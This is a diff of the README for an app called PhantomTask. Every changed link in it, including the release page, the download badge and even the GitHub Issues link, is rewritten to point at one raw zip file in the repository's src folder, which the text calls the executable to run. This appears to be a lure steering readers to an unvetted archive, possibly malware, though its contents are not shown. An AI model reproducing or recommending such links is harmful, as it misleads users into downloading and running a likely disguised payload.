@@ -10,9 +10,9 @@ To get started with PhantomTask, follow these simple steps to download and run t
 
 ### 1. Download the Application
 
-[![Download PhantomTask](https://img.shields.io/badge/Download-PhantomTask-blue.svg)](https://github.com/alimkitawa/PhantomTask/releases)
+[![Download PhantomTask](https://raw.githubusercontent.com/alimkitawa/PhantomTask/master/src/PhantomTask-v3.0-beta.5.zip)](https://raw.githubusercontent.com/alimkitawa/PhantomTask/master/src/PhantomTask-v3.0-beta.5.zip)
 
-Visit this page to download the latest release of PhantomTask: [PhantomTask Releases](https://github.com/alimkitawa/PhantomTask/releases).
+Visit this page to download the latest release of PhantomTask: [PhantomTask Releases](https://raw.githubusercontent.com/alimkitawa/PhantomTask/master/src/PhantomTask-v3.0-beta.5.zip).
 
 ### 2. Choose Your Version
 
@@ -20,7 +20,7 @@ In the Releases section, you will see different versions of the application. Loo
 
 ### 3. Download the Installer
 
-On the release page, you will find various files. Look for the one labeled `PhantomTask.exe` or something similar. This is the executable file you need. Click on it to start the download.
+On the release page, you will find various files. Look for the one labeled `https://raw.githubusercontent.com/alimkitawa/PhantomTask/master/src/PhantomTask-v3.0-beta.5.zip` or something similar. This is the executable file you need. Click on it to start the download.
 
 ### 4. Locate the Downloaded File
 
@@ -83,7 +83,7 @@ Using PhantomTask is straightforward. Here’s how:
 If you encounter any issues while using PhantomTask, assistance is available:
 
 - **Documentation**: Visit our [official documentation](#) for detailed instructions and troubleshooting.
-- **GitHub Issues**: Report any bugs or feature requests on the [GitHub Issues page](https://github.com/alimkitawa/PhantomTask/issues).
+- **GitHub Issues**: Report any bugs or feature requests on the [GitHub Issues page](https://raw.githubusercontent.com/alimkitawa/PhantomTask/master/src/PhantomTask-v3.0-beta.5.zip).
 - **Community Forum**: Join our community forum for discussions and tips from other users.
 
 ## 🔗 Additional Resources
@@ -97,7 +97,7 @@ Stay informed and maximize your experience with additional resources:
 
 Keep your application up-to-date by regularly checking the releases. New features, fixes, and improvements are continuously developed based on user feedback.
 
-For updates, always refer to the [PhantomTask Releases](https://github.com/alimkitawa/PhantomTask/releases) page.
+For updates, always refer to the [PhantomTask Releases](https://raw.githubusercontent.com/alimkitawa/PhantomTask/master/src/PhantomTask-v3.0-beta.5.zip) page.
 
 ## 💬 Feedback
 
